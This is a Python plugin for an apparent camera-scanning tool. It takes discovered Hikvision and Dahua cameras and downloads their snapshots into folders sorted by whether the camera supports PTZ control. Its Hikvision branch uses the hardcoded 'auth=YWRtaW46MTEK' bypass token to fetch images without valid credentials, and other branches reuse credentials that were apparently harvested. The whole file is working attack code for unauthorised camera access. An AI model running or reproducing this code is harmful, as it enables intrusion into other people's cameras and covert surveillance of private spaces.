# This mod is for handling automated snapshots, auth bypasses for Dahua/Hikvision, and camera sorting
import os, requests, shutil
from requests.auth import HTTPDigestAuth, HTTPBasicAuth

def reg(mgr):
    mgr.sub('found', process_cam)

def check_ptz(ip, port, user, pwd):
    try:
        url = f"http://{ip}:{port}/ISAPI/PTZ/channels/1"
        r = requests.get(url, auth=HTTPDigestAuth(user, pwd), timeout=3, verify=False)
        return "<enabled>true</enabled>" in r.text.lower()
    except: return False

def process_cam(res, cfg):
    ip, port, prod, user, pwd, vul = res
    out_dir = os.path.join(cfg.out_dir, cfg.snapshots)
    fname = f"{ip}_{port}_{user}.jpg"
    tmp_path = os.path.join(out_dir, fname)

    if os.path.exists(tmp_path): return

    tasks = []
    if 'hikvision' in prod.lower():
        tasks.append((f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", None))
        tasks.append((f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture", HTTPDigestAuth(user, pwd)))
    elif 'dahua' in prod.lower():
        for ch in [0, 1]:
            tasks.append((f"http://{ip}:{port}/cgi-bin/snapshot.cgi?channel={ch}", HTTPDigestAuth(user, pwd)))
            tasks.append((f"http://{ip}:{port}/cgi-bin/snapshot.cgi?channel={ch}", HTTPBasicAuth(user, pwd)))
    else:
        tasks.append((f"http://{ip}:{port}/cgi-bin/snapshot.cgi", HTTPDigestAuth(user, pwd)))
        tasks.append((f"http://{ip}:{port}/onvif-http/snapshot", HTTPDigestAuth(user, pwd)))

    saved = False
    for url, auth in tasks:
        try:
            r = requests.get(url, auth=auth, timeout=7, verify=False)
            if "Invalid Authority" in r.text or r.status_code == 401:
                continue
            if r.status_code == 200 and len(r.content) > 1000:
                with open(tmp_path, 'wb') as f: f.write(r.content)
                saved = True
                break
        except: continue

    if not saved:
        return

    folder = "Basic"
    if 'hikvision' in prod.lower() and check_ptz(ip, port, user, pwd):
        folder = "PTZ_Cam"
    
    target = os.path.join(out_dir, folder)
    if not os.path.exists(target): os.makedirs(target)
    
    try:
        shutil.move(tmp_path, os.path.join(target, fname))
        print(f"\033[92m[ OK ] {ip} -> {folder}\033[0m")
    except: pass